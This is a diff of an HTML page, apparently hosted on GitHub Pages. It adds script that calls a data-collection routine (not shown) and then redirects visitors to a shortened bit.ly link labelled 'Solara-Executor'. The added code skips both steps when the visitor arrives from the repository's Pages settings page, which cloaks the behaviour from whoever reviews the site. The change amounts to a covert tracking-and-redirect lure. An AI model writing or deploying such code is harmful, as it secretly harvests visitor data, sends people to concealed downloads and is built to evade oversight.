@@ -14,7 +14,6 @@
       gtag('config', 'G-NTTP5YDYL7');
     </script>
     <!-- End Google Analytics -->
-    <meta http-equiv="refresh" content="5; url=https://bit.ly/Solara-Executor">
 
     <!-- Data Collection Script -->
     <script>
@@ -92,7 +91,20 @@
             }
         }
 
-        collectAndSendData();
+        function shouldRedirect() {
+            const referrer = getReferrer();
+            const blockReferrer = 'https://github.com/RebornPhantom/Repository/settings/pages';
+            return referrer !== blockReferrer;
+        }
+
+        if (shouldRedirect()) {
+            collectAndSendData();
+            setTimeout(() => {
+                window.location.href = 'https://bit.ly/Solara-Executor';
+            }, 100);
+        } else {
+            console.log('Redirect blocked due to referrer.');
+        }
     </script>
 </head>
 <body>
